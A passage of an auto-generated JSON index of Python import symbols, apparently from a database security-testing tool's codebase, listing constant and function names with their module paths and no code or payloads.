        "label": "HASH_BINARY_COLUMNS_REGEX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "HASH_EMPTY_PASSWORD_MARKER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "HASH_MOD_ITEM_DISPLAY",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "HASH_RECOGNITION_QUIT_THRESHOLD",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "INVALID_UNICODE_CHAR_FORMAT",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "IS_WIN",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "ITOA64",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "NULL",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "ROTATING_CHARS",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "UNICODE_ENCODING",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "HASHDB_END_TRANSACTION_RETRIES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "HASHDB_FLUSH_RETRIES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "HASHDB_FLUSH_THRESHOLD",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "HASHDB_RETRIEVE_RETRIES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "UNICODE_ENCODING",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "VERSION_STRING",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_INT",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "NULL",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SINGLE_QUOTE_MARKER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "BING_REGEX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DUCKDUCKGO_REGEX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DUMMY_SEARCH_USER_AGENT",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "GOOGLE_CONSENT_COOKIE",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "GOOGLE_REGEX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "HTTP_ACCEPT_ENCODING_HEADER_VALUE",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "UNICODE_ENCODING",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "IS_WIN",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "ACCESS_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "METADB_SUFFIX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "ALTIBASE_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CACHE_DEFAULT_SCHEMA",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CACHE_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CRATEDB_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CUBRID_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DB2_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DERBY_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "EXTREMEDB_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "METADB_SUFFIX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "UNICODE_ENCODING",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "FIREBIRD_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "METADB_SUFFIX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "FRONTBASE_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "H2_DEFAULT_SCHEMA",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "H2_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "HSQLDB_DEFAULT_SCHEMA",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "HSQLDB_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "INFORMIX_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CURRENT_DB",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAXDB_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MCKOI_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MCKOI_DEFAULT_SCHEMA",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MIMERSQL_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MONETDB_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CURRENT_DB",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MSSQL_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MYSQL_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CURRENT_USER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "ORACLE_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "LOBLKSIZE",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PGSQL_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PRESTO_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "METADB_SUFFIX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "RAIMA_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "METADB_SUFFIX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SQLITE_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CURRENT_DB",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SYBASE_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "VERTICA_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "VIRTUOSO_ALIASES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "METADB_SUFFIX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "NULL",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PARAMETER_SPLITTING_REGEX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CURRENT_DB",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "METADB_SUFFIX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PLUS_ONE_DBMSES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "REFLECTED_VALUE_MARKER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "UPPER_CASE_DBMSES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "VERTICA_DEFAULT_SCHEMA",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CHECK_ZERO_COLUMNS_THRESHOLD",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CURRENT_DB",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "METADB_SUFFIX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "NULL",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PLUS_ONE_DBMSES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "UPPER_CASE_DBMSES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "UNICODE_ENCODING",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CURRENT_DB",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "METADB_SUFFIX",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "UPPER_CASE_DBMSES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CURRENT_USER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PLUS_ONE_DBMSES",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "IGNORE_SPACE_AFFECTED_KEYWORDS",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DEFAULT_GET_POST_DELIMITER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "IGNORE_SPACE_AFFECTED_KEYWORDS",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "IGNORE_SPACE_AFFECTED_KEYWORDS",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "IS_WIN",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "RESTAPI_DEFAULT_ADAPTER",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "RESTAPI_DEFAULT_ADDRESS",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "RESTAPI_DEFAULT_PORT",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "UNICODE_ENCODING",
        "importPath": "lib.core.settings",
        "description": "lib.core.settings",
        "isExtraImport": true,
        "detail": "lib.core.settings",
        "documentation": {}
    },
    {
        "label": "columnExists",
        "importPath": "lib.utils.brute",
        "description": "lib.utils.brute",
        "isExtraImport": true,
        "detail": "lib.utils.brute",
        "documentation": {}
    },
    {
        "label": "fileExists",
        "importPath": "lib.utils.brute",
        "description": "lib.utils.brute",
        "isExtraImport": true,
        "detail": "lib.utils.brute",
        "documentation": {}
    },
    {
        "label": "tableExists",
        "importPath": "lib.utils.brute",
        "description": "lib.utils.brute",
        "isExtraImport": true,
        "detail": "lib.utils.brute",
        "documentation": {}
    },
    {
        "label": "columnExists",
        "importPath": "lib.utils.brute",
        "description": "lib.utils.brute",
        "isExtraImport": true,
        "detail": "lib.utils.brute",
        "documentation": {}
    },
    {
        "label": "columnExists",
        "importPath": "lib.utils.brute",
        "description": "lib.utils.brute",
        "isExtraImport": true,
        "detail": "lib.utils.brute",
        "documentation": {}
    },
    {
        "label": "columnExists",
        "importPath": "lib.utils.brute",
        "description": "lib.utils.brute",
        "isExtraImport": true,
        "detail": "lib.utils.brute",
        "documentation": {}
    },
    {
        "label": "tableExists",
        "importPath": "lib.utils.brute",
        "description": "lib.utils.brute",
        "isExtraImport": true,
        "detail": "lib.utils.brute",
        "documentation": {}
    },
    {
        "label": "columnExists",
        "importPath": "lib.utils.brute",
        "description": "lib.utils.brute",
        "isExtraImport": true,
        "detail": "lib.utils.brute",
        "documentation": {}
    },
    {
        "label": "tableExists",
        "importPath": "lib.utils.brute",
        "description": "lib.utils.brute",
        "isExtraImport": true,
        "detail": "lib.utils.brute",
        "documentation": {}
    },
    {
        "label": "copy",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "copy",
        "description": "copy",
        "detail": "copy",
        "documentation": {}
    },
    {
        "label": "logging",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "logging",
        "description": "logging",
        "detail": "logging",
        "documentation": {}
    },
    {
        "label": "random",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "random",
        "description": "random",
        "detail": "random",
        "documentation": {}
    },
    {
        "label": "randint",
        "importPath": "random",
        "description": "random",
        "isExtraImport": true,
        "detail": "random",
        "documentation": {}
    },
    {
        "label": "randint",
        "importPath": "random",
        "description": "random",
        "isExtraImport": true,
        "detail": "random",
        "documentation": {}
    },
    {
        "label": "SystemRandom",
        "importPath": "random",
        "description": "random",
        "isExtraImport": true,
        "detail": "random",
        "documentation": {}
    },
    {
        "label": "time",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "time",
        "description": "time",
        "detail": "time",
        "documentation": {}
    },
    {
        "label": "sleep",
        "importPath": "time",
        "description": "time",
        "isExtraImport": true,
        "detail": "time",
        "documentation": {}
    },
    {
        "label": "sleep",
        "importPath": "time",
        "description": "time",
        "isExtraImport": true,
        "detail": "time",
        "documentation": {}
    },
    {
        "label": "beep",
        "importPath": "extra.beep.beep",
        "description": "extra.beep.beep",
        "isExtraImport": true,
        "detail": "extra.beep.beep",
        "documentation": {}
    },
    {
        "label": "beep",
        "importPath": "extra.beep.beep",
        "description": "extra.beep.beep",
        "isExtraImport": true,
        "detail": "extra.beep.beep",
        "documentation": {}
    },
    {
        "label": "agent",
        "importPath": "lib.core.agent",
        "description": "lib.core.agent",
        "isExtraImport": true,
        "detail": "lib.core.agent",
        "documentation": {}
    },
    {
        "label": "agent",
        "importPath": "lib.core.agent",
        "description": "lib.core.agent",
        "isExtraImport": true,
        "detail": "lib.core.agent",
        "documentation": {}
    },
    {
        "label": "agent",
        "importPath": "lib.core.agent",
        "description": "lib.core.agent",
        "isExtraImport": true,
        "detail": "lib.core.agent",
        "documentation": {}
    },
    {
        "label": "agent",
        "importPath": "lib.core.agent",
        "description": "lib.core.agent",
        "isExtraImport": true,
        "detail": "lib.core.agent",
        "documentation": {}
    },
    {
        "label": "agent",
        "importPath": "lib.core.agent",
        "description": "lib.core.agent",
        "isExtraImport": true,
        "detail": "lib.core.agent",
        "documentation": {}
    },
    {
        "label": "agent",
        "importPath": "lib.core.agent",
        "description": "lib.core.agent",
        "isExtraImport": true,
        "detail": "lib.core.agent",
        "documentation": {}
    },
    {
        "label": "agent",
        "importPath": "lib.core.agent",
        "description": "lib.core.agent",
        "isExtraImport": true,
        "detail": "lib.core.agent",
        "documentation": {}
    },
    {
        "label": "agent",
        "importPath": "lib.core.agent",
        "description": "lib.core.agent",
        "isExtraImport": true,
        "detail": "lib.core.agent",
        "documentation": {}
    },
    {
        "label": "agent",
        "importPath": "lib.core.agent",
        "description": "lib.core.agent",
        "isExtraImport": true,
        "detail": "lib.core.agent",
        "documentation": {}
    },
    {
        "label": "agent",
        "importPath": "lib.core.agent",
        "description": "lib.core.agent",
        "isExtraImport": true,
        "detail": "lib.core.agent",
        "documentation": {}
    },
    {
        "label": "agent",
        "importPath": "lib.core.agent",
        "description": "lib.core.agent",
        "isExtraImport": true,
        "detail": "lib.core.agent",
        "documentation": {}
    },
    {
        "label": "agent",
        "importPath": "lib.core.agent",
        "description": "lib.core.agent",
        "isExtraImport": true,
        "detail": "lib.core.agent",
        "documentation": {}
    },
    {
        "label": "agent",
        "importPath": "lib.core.agent",
        "description": "lib.core.agent",
        "isExtraImport": true,
        "detail": "lib.core.agent",
        "documentation": {}
    },
    {
        "label": "agent",
        "importPath": "lib.core.agent",
        "description": "lib.core.agent",
        "isExtraImport": true,
        "detail": "lib.core.agent",
        "documentation": {}
    },
    {
        "label": "agent",
        "importPath": "lib.core.agent",
        "description": "lib.core.agent",
        "isExtraImport": true,
        "detail": "lib.core.agent",
        "documentation": {}
    },
    {
        "label": "agent",
        "importPath": "lib.core.agent",
        "description": "lib.core.agent",
        "isExtraImport": true,
        "detail": "lib.core.agent",
        "documentation": {}
    },
    {
        "label": "agent",
        "importPath": "lib.core.agent",
        "description": "lib.core.agent",
        "isExtraImport": true,
        "detail": "lib.core.agent",
        "documentation": {}
    },
    {
        "label": "agent",
        "importPath": "lib.core.agent",
        "description": "lib.core.agent",
        "isExtraImport": true,
        "detail": "lib.core.agent",
        "documentation": {}
    },
    {
        "label": "agent",
        "importPath": "lib.core.agent",
        "description": "lib.core.agent",
        "isExtraImport": true,
        "detail": "lib.core.agent",
        "documentation": {}
    },
    {
        "label": "agent",
        "importPath": "lib.core.agent",
        "description": "lib.core.agent",
        "isExtraImport": true,
        "detail": "lib.core.agent",
        "documentation": {}
    },
    {
        "label": "agent",
        "importPath": "lib.core.agent",
        "description": "lib.core.agent",
        "isExtraImport": true,
        "detail": "lib.core.agent",
        "documentation": {}
    },
    {
        "label": "agent",
        "importPath": "lib.core.agent",
        "description": "lib.core.agent",
        "isExtraImport": true,
        "detail": "lib.core.agent",
        "documentation": {}
    },
    {
        "label": "agent",
        "importPath": "lib.core.agent",
        "description": "lib.core.agent",
        "isExtraImport": true,
        "detail": "lib.core.agent",
        "documentation": {}
    },
    {
        "label": "agent",
        "importPath": "lib.core.agent",
        "description": "lib.core.agent",
        "isExtraImport": true,
        "detail": "lib.core.agent",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "cmp",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "LooseVersion",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "round",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "cmp",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "round",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "buffer",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "round",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "WichmannHill",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "patchHeaders",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "LooseVersion",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
        "importPath": "lib.core.compat",
        "description": "lib.core.compat",
        "isExtraImport": true,
        "detail": "lib.core.compat",
        "documentation": {}
    },
    {
        "label": "xrange",
